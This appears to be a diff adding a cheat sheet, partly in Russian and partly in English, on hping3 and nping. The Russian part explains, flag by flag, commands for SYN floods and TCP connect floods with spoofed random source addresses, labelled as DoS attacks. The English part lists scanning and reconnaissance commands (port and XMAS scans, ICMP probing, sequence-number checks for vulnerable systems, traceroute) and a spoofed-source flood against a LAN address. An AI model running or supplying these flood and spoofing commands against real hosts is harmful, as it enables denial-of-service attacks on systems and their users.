@@ -1,0 +1,74 @@
+root@kali:~# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.mysute.com
+
+1) hping3 = Имя бинарного приложения.
+2) -c 100000 = Количество отправленных пакетов.
+3) -d 120 = Размер каждого пакета, отправленного на целевой компьютер.
+4) -S = Я отправляю только пакеты SYN.
+5) -w 64 = Размер окна TCP.
+6) -p 21= Порт назначения (21 - FTP-порт). Здесь вы можете использовать любой порт.
+7) --flood= Отправка пакетов как можно быстрее, без необходимости отображать входящие ответы. Режим наводнения.
+8) --rand-source= Использование случайных источников IP-адресов. Вы также можете использовать -a или -spoof, чтобы скрыть имена хостов. См. Страницу MAN ниже.
+9) www.mysute.com= IP-адрес целевого IP-адреса или целевых компьютеров. Здесь вы также можете использовать название веб-сайта. В моем случае разрешается 127.0.0.1 (как указано в /etc/hostsфайле)
+
+
+Простой поток SYN - DoS с использованием HPING3
+hping3 -S --flood -V www.hping3testsite.com
+
+Простой поток SYN с подделкой IP - DoS с использованием HPING3
+hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
+
+TCP connect flood - DoS с использованием NPING
+nping --tcp-connect -rate = 90000 -c 900000 -q www.hping3testsite.com
+
+
+Bydefault hping3 is loaded with Backtrack 5 and Kali Linux distros.
+
+1) Command to check port no.
+
+hping3 -S http://www.neelpathak.in -p 80 -c 2    (SYN Req, -c = count)
+
+2) Command to check series of ports
+
+hping3 -S 192.168.1.7 -p ++50 -c 5     (SYN req, starting with port 50 as a destination port, -c = count )
+
+Giving the destination ports if they are open then they will reply on our ports..:P, If the flags we get are RA then the ports are closed.
+
+3) hping3 -1 192.168.1.x –rand-dest -I eth0   (-1 == ICMP service, -I = interface, –rand-dest = Random destination )
+
+To check which hosts have blocked ICMP, if the device replies then the ICMP is not blocked.
+
+4) hping3 -1 192.168.1.1 –icmp-ts -c 2
+
+(Icmp echo timestamp)
+
+5) hping3 -1 192.168.1.1 –icmp-addr -c 2    (To know the netmask) 🙂
+
+(Generally no replies will get, as machines are intelligent nowadays 😛 )
+
+6) hping3 -8 50-56 -S 8.8.8.8     (-8 = SCAN, 50-56 = range , -S = SYN)
+(Just scans TCP ports)
+
+7) hping3 -2 192.168.1.6 -p 80 -c 1     (-2 = UDP)
+
+8) hping3 -F -P -U 192.168.1.28 -c 3    (XMAS scan)
+
+9) hping3 192.168.1.38 -Q -p 139 -s (Getting sequence numbers, if initial seq number is predictable then there must be some vulnerability in OS . Generally shown in older operating system)
+
+10) hping3 -S 192.168.1.38 -a 192.168.1.254 -p 22 –flood (-S = SYN, -a <I.P.> = Spoofed IP address, –flood = Flooding)
+11) hping3 -2 http://www.neelpathak.in -p ++44444 -T -n      (-T = traceroute, -n = don`t bother name resolution, -2 = UDP)
+
+(Use ctrl+z to skip that hop 😛 )
+
+12) hping3 -S http://www.neelpathak.in -p 53 -T
+
+(Use to find load balancing, use this and above command. If you get different IP address here at a particular hop then probably there is load balancing present)
+
+13) hping3 -S http://www.neelpathak.in -p 80 -T –ttl 13 –tr-keep -n (–ttl 13 = setting ttl to 13, every host will forward except that of hop 13, –tr-keep = don`t bother about the ttl values, Here one must see the repeating IP address from that you can come to know that there is some sort of the packets forwarding from different devices..)
+
+14) Specially crafted TCP packet with HPING3
+
+hping3
+hping send “ip(saddr=<Spoofed IP in network>,daddr=<Destination IP>)+tcp(sport=6783,dport=80,flags=s)”
+
+Sending crafted packet to the destination.
+The first part is the network layer part and then the second part is the transport layer.
